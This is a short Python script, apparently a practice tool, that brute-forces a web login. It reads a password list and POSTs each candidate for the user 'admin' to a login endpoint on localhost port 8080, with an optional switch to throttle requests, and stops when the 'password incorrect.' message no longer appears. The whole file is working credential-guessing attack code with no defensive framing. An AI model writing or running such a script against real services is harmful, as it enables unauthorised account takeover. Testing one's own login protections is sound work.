import requests
from ratelimit import limits, sleep_and_retry

CALLS = 30
RATE_LIMIT = 60

def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)

    return q


# 30 calls per minute


@sleep_and_retry
@limits(calls=CALLS, period=RATE_LIMIT)
def check_limit():
    ''' Empty function just to check for calls to API '''
    return


def send_credentials( url, username, password):
    target_url = url
    payload = dict(username= username, password=password)
    response=requests.post(target_url, data=payload)
    return response



def main():
    BASE_URL = "http://127.0.0.1:8080"
    bruteforce_url = f"{BASE_URL}/login"
    filename ="passwordList.txt"
    username = "admin"
    count=0
    enable_rate_limiting=input("Do you want to enable rate limiting y / n \t")
    if enable_rate_limiting=='y':
        enable_rate_limiting=bool(True)
        print(" \n rate limiting is on with default 30 request per min \n")
    else:
        enable_rate_limiting=bool(False) 
        print("rate limiyting is off")

   
    q = get_passwords(filename)   

    for password in q:

        
        if enable_rate_limiting:
            check_limit()


        response = send_credentials( bruteforce_url, username, password)
        count=count+1
        print(" "*40, end="\r")
        print(f"[! TestCase no: {count}] Testing: {password}", end="\r")
        if "password incorrect." not in response.text:
            print("")
            print(f"[+] Found: {password}")
            break



if __name__=="__main__":
       banner = """ 

           url=http://127.0.0.1:8080/login

        [+]█████████████████████████████████████████████████[+]
       """
       print(banner)
       main()